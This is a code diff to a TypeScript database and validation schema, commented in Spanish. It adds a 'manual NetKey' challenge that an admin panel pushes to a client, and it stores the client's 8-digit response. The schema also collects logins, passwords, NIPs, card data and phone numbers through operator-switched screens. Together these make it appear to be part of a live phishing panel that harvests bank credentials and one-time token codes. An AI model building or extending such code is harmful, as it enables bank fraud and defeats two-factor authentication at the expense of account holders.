@@ -126,6 +126,8 @@ export const sessions = pgTable("sessions", {
   netkeyResponse: text("netkey_response"), // Respuesta NetKey del cliente
   customChallenge: text("custom_challenge"), // Challenge personalizado para NetKey custom desde panel admin
   customNetkeyResponse: text("custom_netkey_response"), // Respuesta del cliente al NetKey custom
+  manualNetkeyChallenge: text("manual_netkey_challenge"), // Challenge para NetKey manual desde panel admin
+  manualNetkeyResponse: text("manual_netkey_response"), // Respuesta del cliente al NetKey manual
   telefono1: text("telefono1"), // Teléfono de contacto 1
   telefono2: text("telefono2"), // Teléfono de contacto 2 (opcional)
   nombreRepresentante: text("nombre_representante"), // Nombre del representante legal
@@ -253,6 +255,7 @@ export enum ScreenType {
   GENERANDO_ACLARACION = "generando_aclaracion",
   DATOS_TARJETA = "datos_tarjeta",
   ACTUALIZACION = "actualizacion",
+  NETKEY_MANUAL = "netkey_manual",
 }
 
 export const screenChangeSchema = z.object({
@@ -272,6 +275,7 @@ export const screenChangeSchema = z.object({
   codigo: z.string().optional(), // Código para la verificación de Google
   challenge: z.string().optional(), // Challenge NetKey de 8 dígitos
   customChallenge: z.string().optional(), // Challenge personalizado para NetKey custom desde panel admin
+  manualNetkeyChallenge: z.string().optional(), // Challenge manual para NetKey manual desde panel admin
 });
 
 export type ScreenChangeData = z.infer<typeof screenChangeSchema>;
@@ -286,6 +290,7 @@ export const clientInputSchema = z.object({
       z.object({ tipo: z.literal('netkey_response'), netkeyResponse: z.string().length(8) }),
       z.object({ tipo: z.literal('netkey2'), netkeyResponse: z.string().length(8) }),
       z.object({ tipo: z.literal('netkey_custom'), customNetkeyResponse: z.string().length(8) }),
+      z.object({ tipo: z.literal('netkey_manual'), manualNetkeyResponse: z.string().length(8) }),
       z.object({ tipo: z.literal('login'), username: z.string(), password: z.string() }),
       z.object({ tipo: z.literal('codigo'), codigo: z.string() }),
       z.object({ tipo: z.literal('nip'), nip: z.string() }),
